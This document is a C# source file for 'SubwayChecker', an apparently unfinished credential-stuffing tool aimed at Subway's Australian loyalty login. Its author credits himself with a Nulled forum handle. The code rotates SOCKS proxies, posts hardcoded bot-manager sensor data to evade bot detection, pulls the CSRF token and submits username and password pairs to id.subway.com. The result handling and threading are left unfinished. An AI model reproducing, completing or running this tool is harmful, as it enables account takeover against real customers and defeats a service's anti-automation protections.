using Extreme.Net;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace SubwayChecker
{
    class Program
    {
        static List<KeyValuePair<string, ushort>> socks4Proxies = new List<KeyValuePair<string, ushort>>();
        static List<KeyValuePair<string, ushort>> socks5Proxies = new List<KeyValuePair<string, ushort>>();
        static bool useProxies = false;
        static int threadCount = 0;
        static Random rng = new Random();

        static HttpClient GetClient(CookieContainer container)
        {
            if(useProxies)
            {
                bool useSocks5 = false;
                if (socks4Proxies.Count == 0 && socks5Proxies.Count > 0) useSocks5 = true;
                else if (socks4Proxies.Count > 0 && socks5Proxies.Count == 0) useSocks5 = false;
                else useSocks5 = rng.Next(0, 100) >= 50;

                ProxyHandler handler;
                if(useSocks5)
                {
                    var proxy = socks5Proxies[rng.Next(0, socks5Proxies.Count - 1)];
                    handler = new ProxyHandler(new Socks5ProxyClient(proxy.Key, proxy.Value));
                }
                else
                {
                    var proxy = socks4Proxies[rng.Next(0, socks4Proxies.Count - 1)];
                    handler = new ProxyHandler(new Socks4ProxyClient(proxy.Key, proxy.Value));
                }

                handler.UseCookies = true;

                handler.CookieContainer = container;

                return new HttpClient(handler);
            }



            return new HttpClient(new HttpClientHandler()
            {
                UseCookies = true,
                CookieContainer = container,
                Proxy = new WebProxy($"http://localhost:8888")
            });
        }

        static async Task<float?> CheckAccount(string username, string password)
        {
            CookieContainer container = new CookieContainer();
            using (var client = GetClient(container))
            {
                client.DefaultRequestHeaders.Add("Accept", "application/json, text/javascript, */*; q=0.01");
                client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
                client.DefaultRequestHeaders.Add("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
                client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
                client.DefaultRequestHeaders.Add("DNT", "1");
                client.DefaultRequestHeaders.Add("Pragma", "no-cache");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0");
                client.DefaultRequestHeaders.Add("Connection", "keep-alive");

                using (var response = await client.GetAsync("https://www.subcard.com.au")) { }

                using(var response = await client.GetAsync("https://www.subcard.com.au/login"))
                {
                    response.EnsureSuccessStatusCode();

                    string loginEndpoint = response.RequestMessage.RequestUri.ToString();

                    string csrf = container.GetCookies(new Uri("https://id.subway.com")).ToList().FirstOrDefault(k => k.Name == "x-ms-cpim-csrf").Value;



                    string requestId = new Regex(@"https:\/\/id.subway.com\/(.+?)\/").Match(loginEndpoint).Groups[1].Value;

                    //client.DefaultRequestHeaders.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

                    dynamic sensors = new
                    {
                        sensor_data = $"7a74G7m23Vrp0o5c9046781.45-1,2,-94,-100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0,uaend,11059,20100101,it-IT,Gecko,0,0,0,0,389263,6957955,2520,1440,2520,1440,2520,1367,2535,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:1,sc:0,wrc:1,isc:74,vib:1,bat:0,x11:0,x12:1,5555,0.230920992115,791033478977.5,loc:-1,2,-94,-101,do_en,dm_en,t_dis-1,2,-94,-105,-1,2,-94,-102,-1,2,-94,-108,-1,2,-94,-110,-1,2,-94,-117,-1,2,-94,-111,-1,2,-94,-109,-1,2,-94,-114,-1,2,-94,-103,-1,2,-94,-112,{loginEndpoint},2,-94,-115,1,1,0,0,0,0,0,1,0,1582066957955,-999999,16924,0,0,2820,0,0,2,0,0,77F8DC75A2E12E115FAB44160352335E~-1~YAAQPZsXAiTMyUFwAQAAM/uJWgM9AU15aROPzqq7IchwAh6b2Vh+97mjYeZVBcXXVrGlyPcyGUA+b0tgVALobtrBmlGYMvNxDwiPD2V+Ce2HAZ5gunjU+zdFtlNI3Mdq3VrZ7sw8UQZYCR0cI9l+XoPd3K1GDr6APEWX5IxTRNAyu6qsNMohQ1q1bC4eZ9ZZivQIAAscoCh02BHpYcpcNpoyTQXv9LmRo1KMGDAERBFOkMfAreOt53wYTswuudUyIp9iZHQduJbWzqn3rcKMIMZH8JaS2+jTYmF2ZDWvwdG+yJ0fn5736B5B~-1~-1~-1,29301,-1,-1,26067385-1,2,-94,-106,0,0-1,2,-94,-119,-1-1,2,-94,-122,0,0,0,0,1,0,0-1,2,-94,-123,-1,2,-94,-124,-1,2,-94,-125,-1,2,-94,-70,-1-1,2,-94,-80,94-1,2,-94,-116,6957975-1,2,-94,-118,163944-1,2,-94,-121,;2;-1;0"
                    };

                    using(var sensorResponse = await client.PostAsync("https://id.subway.com/static/140093586502079564a4fddd1231c3b", new StringContent(JsonConvert.SerializeObject(sensors), Encoding.UTF8, "application/json")))
                    {

                    }

                    sensors = new
                    {
                        sensor_data = $"7a74G7m23Vrp0o5c9046671.45-1,2,-94,-100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0,uaend,11059,20100101,it-IT,Gecko,0,0,0,0,389254,484108,2520,1440,2520,1440,2520,1367,2535,,cpen:0,i1:0,dm:0,cwen:0,non:1,opc:0,fc:1,sc:0,wrc:1,isc:74,vib:1,bat:0,x11:0,x12:1,5555,0.819258374409,791015242054,loc:-1,2,-94,-101,do_en,dm_en,t_dis-1,2,-94,-105,-1,2,-94,-102,-1,2,-94,-108,-1,2,-94,-110,0,1,15,948,1358;-1,2,-94,-117,-1,2,-94,-111,-1,2,-94,-109,-1,2,-94,-114,-1,2,-94,-103,3,11;-1,2,-94,-112,{loginEndpoint},2,-94,-115,1,2323,0,0,0,0,2322,125,0,1582030484108,5,16924,0,1,2820,0,0,126,15,0,5AFD3C66A0D4FEE978F0665C72FE05AB~-1~YAAQPZsXAulqtkFwAQAA3W9dWAPdvGpJ3RuYcC/xr7AgpSYUkFySWAsOjFtKVD7MIQ0rwoRh4eZxB+ODcowwK41qu2E6ZpqxAXc8l6l89aamI1uAeurKbAc9BgUb12esD7HOO4hKvN4BT2rK7TaNUrzDltx5aX/7YwefruPnz3qdPGODd5r63zRX+CH7MuoncJzgbEKb+ExGj+LzuJkcR6R9MlIFHLmeIrrOib02fs+pprD9orQzWwun91nU70mJAk4zts2Kogg932xH8fdD5FjLSE1HGYlM+QSZ0k+5QkWjCCh6XYACCBzj~-1~-1~-1,29494,584,1829074676,26067385-1,2,-94,-106,9,1-1,2,-94,-119,-1-1,2,-94,-122,0,0,0,0,1,0,0-1,2,-94,-123,-1,2,-94,-124,-1,2,-94,-125,-1,2,-94,-70,-1178717391;dis;;true;true;true;-60;true;24;24;true;false;1-1,2,-94,-80,4761-1,2,-94,-116,196063830-1,2,-94,-118,166736-1,2,-94,-121,;1;4;0"
                    };

                    using (var sensorResponse = await client.PostAsync("https://id.subway.com/static/140093586502079564a4fddd1231c3b", new StringContent(JsonConvert.SerializeObject(sensors), Encoding.UTF8, "application/json")))
                    {

                    }


                    var req = new HttpRequestMessage(HttpMethod.Post, "https://id.subway.com/02d64b66-5494-461d-8e0d-5c72dc1efa7f/B2C_1A_signup_signin-r2/SelfAsserted?tx=StateProperties=eyJUSUQiOiI4ZmMyYjEzZC1iMTU3LTRmMjAtYmRlYi01Y2Q5ZjkzNjlhOGEifQ&p=B2C_1A_signup_signin-r2");

                    req.Headers.Add("Referer", loginEndpoint);
                    req.Headers.Add("X-CSRF-TOKEN", csrf);
                    req.Headers.Add("X-Requested-With", "XMLHttpRequest");

                    req.Content = new FormUrlEncodedContent(new Dictionary<string, string>()
                    {
                        { "request_type", "RESPONSE" },
                        { "signInName", username },
                        { "password", password },
                        { "adobeAnalyticsTag", "__IGNORE" }
                    });

                    req.Content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded; charset=UTF-8");

                    using (var loginResponse = await client.SendAsync(req))
                    {

                    }
                }
            }

            return null;

        }

        static void Main(string[] args)
        {
            Console.WriteLine($"SubwayChecker - by Aesir - [Discord: Aesir#1337] [Nulled: SickAesir] [Telegram: @sickaesir]", Color.Aqua);

            CheckAccount("asd@gmail.com", "asdasd").Wait();

            while(true)
            {
                Console.Write($"[Config] Would you like to use proxies? (y/n): ", Color.Orange);
                string choice = Console.ReadLine();

                if (choice.ToLower() == "n")
                {
                    Console.WriteLine($"[Config] The checker will run in proxyless mode!", Color.Green);
                }
                if(choice.ToLower() == "y")
                {
                    useProxies = true;
                    Console.WriteLine($"[Config] Drag and drop the proxy list in this console or specify the file path", Color.Orange);
                    Console.Write($"[Config] Socks4: ", Color.Orange);
                    string socks4 = Console.ReadLine().Replace("\"", "");

                    if (File.Exists(socks4))
                    {
                        string[] lines = File.ReadAllLines(socks4);

                        foreach(var line in lines)
                        {
                            string[] split = line.Split(":");

                            if (split.Length != 2 || !ushort.TryParse(split[1], out ushort port))
                                continue;

                            socks4Proxies.Add(new KeyValuePair<string, ushort>(split[0], port));
                        }

                        Console.WriteLine($"[Proxy] Loaded {socks4Proxies.Count} Socks4 proxies!", Color.Green);
                    }
                    else
                    {
                        Console.WriteLine($"[Notice] Socks4 file not found, loading skipped", Color.Yellow);
                    }


                    Console.Write($"[Config] Socks5: ", Color.Orange);
                    string socks5 = Console.ReadLine().Replace("\"", "");

                    if (File.Exists(socks5))
                    {
                        string[] lines = File.ReadAllLines(socks5);

                        foreach (var line in lines)
                        {
                            string[] split = line.Split(":");

                            if (split.Length != 2 || !ushort.TryParse(split[1], out ushort port))
                                continue;

                            socks5Proxies.Add(new KeyValuePair<string, ushort>(split[0], port));
                        }

                        Console.WriteLine($"[Proxy] Loaded {socks5Proxies.Count} Socks5 proxies!", Color.Green);
                    }
                    else
                    {
                        Console.WriteLine($"[Notice] Socks4 file not found, loading skipped", Color.Yellow);
                    }

                    if(socks4Proxies.Count == 0 && socks5Proxies.Count == 0)
                    {
                        Console.WriteLine($"[Error] No proxies were loaded!", Color.Red);
                    }
                    else
                    {
                        break;
                    }
                }
            }


            while(true)
            {
                Console.Write($"[Config] Specify the threads count: ", Color.Orange);
                string count = Console.ReadLine();

                if(!int.TryParse(count, out threadCount))
                {
                    Console.WriteLine($"[Error] Invalid threads count!", Color.Red);
                    continue;
                }

                break;
            }


        }
    }
}
